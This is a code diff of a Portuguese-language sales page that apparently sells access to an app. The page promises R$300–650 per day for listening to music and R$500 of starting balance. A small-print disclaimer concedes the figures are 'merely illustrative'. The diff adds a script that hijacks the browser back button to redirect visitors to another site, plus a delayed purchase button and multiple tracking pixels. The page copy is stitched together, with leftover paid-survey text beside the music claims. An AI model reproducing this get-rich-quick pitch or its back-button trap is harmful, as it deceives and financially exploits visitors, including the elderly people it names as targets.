@@ -8,17 +8,17 @@
 
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Cabin:ital,wght@0,400;0,500;0,600;0,700;1,f;1,500;1,600;1,700&family=Dosis:wght@200;300;400;500;600;700;800&family=Oswald:wght@200;300;400;500;600;700&family=Signika:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cabin:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&family=Dosis:wght@200;300;400;500;600;700;800&family=Oswald:wght@200;300;400;500;600;700&family=Signika:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 
     <link rel="stylesheet" href="./assets/css/com.css">
 
     <!-- Título da Página -->
-    <title>Perguntas Remuneradas</title>
+    <title>Ganhando Com Músicas</title>
     
     <style type="text/css">
       header {
         color: white;
-        background-image: url("assets/img/background.png");
+        background-image: url("assets/img/istock-601370366.jpg");
         background-color: rgba(0, 0, 0, 0.6);
         background-position: center;
         background-size: cover;
@@ -27,45 +27,177 @@
       }
     </style>
     
+    
    
-<script data-obct type = "text/javascript">
-  /** DO NOT MODIFY THIS CODE**/
-  !function(_window, _document) {
-    var OB_ADV_ID = '00635682c534eb86cc38c9fbb1c904baea';
-    if (_window.obApi) {
-      var toArray = function(object) {
-        return Object.prototype.toString.call(object) === '[object Array]' ? object : [object];
-      };
-      _window.obApi.marketerId = toArray(_window.obApi.marketerId).concat(toArray(OB_ADV_ID));
-      return;
-    }
-    var api = _window.obApi = function() {
-      api.dispatch ? api.dispatch.apply(api, arguments) : api.queue.push(arguments);
-    };
-    api.version = '1.1';
-    api.loaded = true;
-    api.marketerId = OB_ADV_ID;
-    api.queue = [];
-    var tag = _document.createElement('script');
-    tag.async = true;
-    tag.src = '//amplify.outbrain.com/cp/obtp.js';
-    tag.type = 'text/javascript';
-    var script = _document.getElementsByTagName('script')[0];
-    script.parentNode.insertBefore(tag, script);
-  }(window, document);
+    
+    <script>
+        (function(b) {
+            var a = {
+                version: "0.0.1",
+                history_api: typeof history.pushState !== "undefined",
+                init: function() {
+                    b.location.hash = "#no-back";
+                    a.configure();
+                },    
+                hasChanged: function() {
+                    if (b.location.hash == "#no-back") {
+                        b.location.hash = "#";
+                        b.location.href = "https://aplicativosecreto.live/b"; //LINK PARA REDIRECIONAR AQUI
+                    }
+                },
+                checkCompat: function() {
+                    if (b.addEventListener) {
+                        b.addEventListener("hashchange", a.hasChanged, false);
+                    } else {
+                        if (b.attachEvent) {
+                            b.attachEvent("onhashchange", a.hasChanged);
+                        } else {
+                            b.onhashchange = a.hasChanged;
+                        }
+                    }
+                },
+                configure: function() {
+                    if (b.location.hash == "#no-back") {
+                        if (this.history_api) {
+                            history.pushState(null, "", "#");
+                        } else {
+                            b.location.hash = "#";
+                            b.location.href = "https://aplicativosecreto.live/b"; //LINK PARA REDIRECIONAR AQUI
+                        }
+                    }
+                    a.checkCompat();
+                    a.hasChanged();
+                }
+            };
+            if (typeof define === "function" && define.amd) {
+                define(function() {
+                    return a;
+                });
+            } else {
+                if (typeof module === "object" && module.exports) {
+                    module.exports = a;
+                } else {
+                    b.noback = a;
+                }
+            }
+            a.init();
+        }(window));
+    </script>
 
-  obApi('track', 'PAGE_VIEW');
-  <script>
-  obApi('track', 'PURCHASE', {
-	orderValue: '%%DYNAMIC_ORDER_VALUE_COMES_HERE%%', 
-	currency: 'BRL',
-});
-  obApi('track', 'Add to cart', {
-	orderValue: '%%DYNAMIC_ORDER_VALUE_COMES_HERE%%', 
-	currency: 'BRL',
-});
+    
+    
+    
+    
+    
+    <script>
+(function() {
+     const utmParamQueryString = new URLSearchParams(window.location.search);
+     if (utmParamQueryString.toString()) {
+          var navLinks = document.querySelectorAll('a');
+          navLinks.forEach(function(item) {
+               if (item.href.indexOf("go.perfectpay.com.br") !== -1) {
+                    if (item.href.indexOf('?') === -1) {
+                         item.href += '?' + utmParamQueryString.toString();
+                    } else {
+                         item.href += '&' + utmParamQueryString.toString();
+                    }
+               }
+          });
+     }
+})();
+</script>
+    
+   
+    
+   <!-- Taboola Pixel Code -->
+<script type='text/javascript'>
+  window._tfa = window._tfa || [];
+  window._tfa.push({notify: 'event', name: 'page_view', id: 1433362});
+  !function (t, f, a, x) {
+         if (!document.getElementById(x)) {
+            t.async = 1;t.src = a;t.id=x;f.parentNode.insertBefore(t, f);
+         }
+  }(document.createElement('script'),
+  document.getElementsByTagName('script')[0],
+  '//cdn.taboola.com/libtrc/unip/1433362/tfa.js',
+  'tb_tfa_script');
+</script>
+<!-- End of Taboola Pixel Code -->
+    
+    <!-- Taboola Pixel Code -->
+<script>
+    _tfa.push({notify: 'event', name: 'view_content_vsl_gcm', id: 1433362});
+</script>
+<!-- End of Taboola Pixel Code -->
+    
+   <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-243527813-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-243527813-1');
 </script>
 
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-243527813-3"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-243527813-3');
+</script>
+
+    
+    <!-- Global site tag (gtag.js) - Google Ads: 10995936829 -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-10995936829"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-10995936829');
+</script>
+
+    <!-- Meta Pixel Code - Conta 2 - Bru -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '3461309434100026');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=3461309434100026&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+    
+    
+    <!-- Meta Pixel Code - Conta 3 - Bru -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '3461309434100026');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=3461309434100026&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+    
     
   </head>
   <body>
@@ -75,85 +207,22 @@
         <div class="row justify-content-center">
           <div class="col-lg-8 text-center">
             <!-- Imagem Ultrasecreto -->
-          
+            <img class="img-fluid" src="./assets/img/ultra_secreto_vermelho-removebg-preview.png">
+
             <!-- Headline -->
-            
+            <h3 class="my-4"><b>Revelado: 3 passos para receber de R$300 a R$650 por dia ouvindo músicas com esse aplicativo</b></h3>
+            <p>*Crie sua conta hoje e comece com <b>500 reais</b> de saldo dentro do aplicativo</p>
 
             <!-- VSL -->
-		  
-		   <img class="img-fluid" src="./assets/img/ultra_secreto_vermelho-removebg-preview.png">
-		  
-		
-<p>Opinião Remunerada ensina pessoas comuns, de qualquer idade, a ganhar de R$50 a R$350 por dia somente respondendo as perguntas rápidas sobre os produtos e serviços dessas empresas.</p> </div>
-
-
+          <p>Opinião Remunerada ensina pessoas comuns, de qualquer idade, a ganhar de R$50 a R$350 por dia somente respondendo as perguntas rápidas sobre os produtos e serviços dessas empresas.</p> </div>
 <p>Acontece que atualmente <strong>existem muitas empresas colhendo opiniões e poucas pessoas respondendo as pesquisas</strong>.</p><p>Isso faz com que cada pesquisa, que leva de 5 a 10 minutos para ser respondida, pague o equivalente a R$30 a R$50.</p>
 <p>Essas pesquisas são genéricas, rápidas e super fáceis de serem respondidas, o aplicativo é simples e até pessoas mais idosas não tem dificuldade alguma em realizar as tarefas para receber o dinheiro.</p> </div>
-
-
-<div class="elementor-element elementor-element-524d45e5 elementor-widget elementor-widget-heading" data-id="524d45e5" data-element_type="widget" data-widget_type="heading.default">
-<div class="elementor-widget-container">      
-	<h2 class="elementor-heading-title elementor-size-default">Benefícios do Aplicativo Opinião Remunerada:</h2> </div>
-	      </div>
-	    
-	    
-<div class="elementor-element elementor-element-29e4d0b1 elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="29e4d0b1" data-element_type="widget" data-widget_type="icon-list.default">
-<div class="elementor-widget-container">
-<link rel="stylesheet" href="https://eeu777ambgr.exactdn.com/wp-content/plugins/elementor/assets/css/widget-icon-list.min.css"> <ul class="elementor-icon-list-items">
-<li class="elementor-icon-list-item">
-<span class="elementor-icon-list-icon">
-<i aria-hidden="true" class="fas fa-check-circle"></i> </span>
-<span class="elementor-icon-list-text">Inúmeras pesquisas para responder que pagam de R$30 a R$50</span>
-</li>
-<li class="elementor-icon-list-item">
-<span class="elementor-icon-list-icon">
-<i aria-hidden="true" class="fas fa-check-circle"></i> </span>
-<span class="elementor-icon-list-text">Pode ser feito do celular e leva cerca de 10 minutos por pesquisa</span>
-</li>
-<li class="elementor-icon-list-item">
-<span class="elementor-icon-list-icon">
-<i aria-hidden="true" class="fas fa-check-circle"></i> </span>
-<span class="elementor-icon-list-text">Não precisa de conhecimento avançado sobre nenhum assunto</span>
-</li>
-<li class="elementor-icon-list-item">
-<span class="elementor-icon-list-icon">
-<i aria-hidden="true" class="fas fa-check-circle"></i> </span>
-<span class="elementor-icon-list-text">Pode ser feito de qualquer celular e por qualquer pessoa</span>
-</li>
-<li class="elementor-icon-list-item">
-<span class="elementor-icon-list-icon">
-<i aria-hidden="true" class="fas fa-check-circle"></i> </span>
-<span class="elementor-icon-list-text">Poucas pessoas conhecem, portanto as empresas ainda pagam uma boa quantia</span>
-</li>
- <li class="elementor-icon-list-item">
-<span class="elementor-icon-list-icon">
-<i aria-hidden="true" class="fas fa-check-circle"></i> </span>
-<span class="elementor-icon-list-text">Valor acessível e pode ser parcelado no cartão</span>
-</li>
-</ul>
-</div>
-</div>
-	  
-	  <div class="container"> 
-		  
-		  
-		  <p> <img class="img-fluid" src="./assets/img/opinioes remun.png"> </p>
-		  <p>
-		  Após realizar sua compra conosco, você receberá acesso a um aplicativo chamado Opiniões Remuneradas. Dentro dessa aplicativo você fará seu login com um email e senha. Após criar sua conta, você verá dentro do seu aplicativo, a área para responder perguntas e ser remunerado por isso. As perguntas são sobre os produtos das próprias empresas. As empresas são de diversos nichos, como vestuário, tecnologia e também de cuidados com animais de estimação. As empresas irão lhe pagar, porque, respondendo essas perguntas você as ajudará na pesquisa de público alvo delas. Assim, entendendo melhor seu público alvo, essas empresas conseguirão melhorar seus anúncios e se tornarem mais lucrativas. Portanto, para acelerar esse processo, elas pagam um certo valor em dinheiro para os usuários que as ajudam respondendo suas pesquisas. Dentro do aplicativo Opiniões Remuneradas você terá acesso a essas pesquisas</p>
-		  
-		  <Clique no botão abaixo e faça sua compra do aplicativo. Ao clicar, você será redirecionado para uma página de pagamentos, onde você irá colocar seu email e método de pagamento. Coloque seu email correto, pois você receberá acesso ao aplicativo via EMAIL</P>
-		  
-		  
-		  
-	      <div>
-		      <p>     </p>
-	      <p> Esse é um produto DIGITAL, você receberá após a sua compra seu acesso ao aplicativo que te paga para dar opiniões e também a ebooks que te ensinam a usar seu aplicativo. Por ser um produto digital, não é necessário envio do produto, pois você recebe acesso a tudo via EMAIL! Logo, o reembolso é mais fácil também, para pedir reembolso basta nos enviar um email e pronto!<p>
+ <p>Após realizar sua compra conosco, você receberá acesso a um aplicativo chamado Opiniões Remuneradas. Dentro dessa aplicativo você fará seu login com um email e senha. Após criar sua conta, você verá dentro do seu aplicativo, a área para responder perguntas e ser remunerado por isso. As perguntas são sobre os produtos das próprias empresas. As empresas são de diversos nichos, como vestuário, tecnologia e também de cuidados com animais de estimação. As empresas irão lhe pagar, porque, respondendo essas perguntas você as ajudará na pesquisa de público alvo delas. Assim, entendendo melhor seu público alvo, essas empresas conseguirão melhorar seus anúncios e se tornarem mais lucrativas. Portanto, para acelerar esse processo, elas pagam um certo valor em dinheiro para os usuários que as ajudam respondendo suas pesquisas. Dentro do aplicativo Opiniões Remuneradas você terá acesso a essas pesquisas</p>
+	 <p> Esse é um produto DIGITAL, você receberá após a sua compra seu acesso ao aplicativo que te paga para dar opiniões e também a ebooks que te ensinam a usar seu aplicativo. Por ser um produto digital, não é necessário envio do produto, pois você recebe acesso a tudo via EMAIL! Logo, o reembolso é mais fácil também, para pedir reembolso basta nos enviar um email e pronto!<p>
 	      <p>Contato: +55 31 945683256 - Email:produtosuporteaqui@gmail.com</p>
-	      <p>Loja Divino Luxo, CNPJ 39.504.571/0001-32, Av Juscelino Kubitschek, Londrina, Paraná, Brasil</p>
-	      </div>
-		  
-		  
-		  <!-- Botão 1 -->
+	      <p>Loja Divino Luxo, CNPJ 39.504.571/0001-32, Av Juscelino Kubitschek, Londrina, Paraná, Brasil</p>	  
+            
+            <  <!-- Botão 1 -->
             <div id="cta1" class="mt-4 d-none">
               <a href="https://go.perfectpay.com.br/PPU38CLPM3C" class="a-btn" style="text-decoration: none;">
                 <span class="span-btn">QUERO OBTER ACESSO!</span>
@@ -164,28 +233,21 @@
         </div>
       </div>
     </header>
-
     
- 
-                        </td>
-                      </tr>
-                    </tbody>
-                  </table>
-                </div>
-              </div>
-            </div>
-            
-          </div>
-        </div>
-      </div>
-    </section>
+   
 
     <footer class="bg-dark py-3 text-center">
-      <div class="text-white"><a href="https://sitesquepagam.com/opiniao-y/termos-de-uso.html" class="text-white">Termos de Uso</a> | <a href="https://sitesquepagam.com/opiniao-y/politicas-privacidade.html" class="text-white">Política de Privacidade</a></div>
-    </footer>
+      <div class="text-white"><a href="termosprodutosdegraca.html" class="text-white">Termos de Uso</a> | <a href="privacidadeprodutosdegraca.html" class="text-white">Política de Privacidade</a> 
+        </div>
+        
+       <div class="grid-container">
+        <p> <font size="-2" >Aviso:Os valores acima são meramente ilustrativos, trata-se de valores alcançados por alguns usuários, logo é plenamente possível alcançar entre R$300 a R$650 reais por dia, entretanto, o valor pode variar conforme a utilização por cada usuário, bem como a disponibilidade de músicas por dia.</p></font></div>
+      <p> <font size="-2" >*Bônus iniciais em valores de saldo podem ser concedidos periodicamente, o saque dos bônus seguem as regras de saques descritas nos termos de uso do web app. <p>
+    </div>
+        </footer>
 
     <script type="text/javascript">
-      setTimeout(() => {document.getElementById("cta1").classList.remove("d-none"); document.getElementById("cta2").classList.remove("d-none")}, 000); // temporização da Call to Action (em milissegundos)
+      setTimeout(() => {document.getElementById("cta1").classList.remove("d-none"); document.getElementById("cta2").classList.remove("d-none")}, 890000); // temporização da Call to Action (em milissegundos)
     </script>
 
     <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
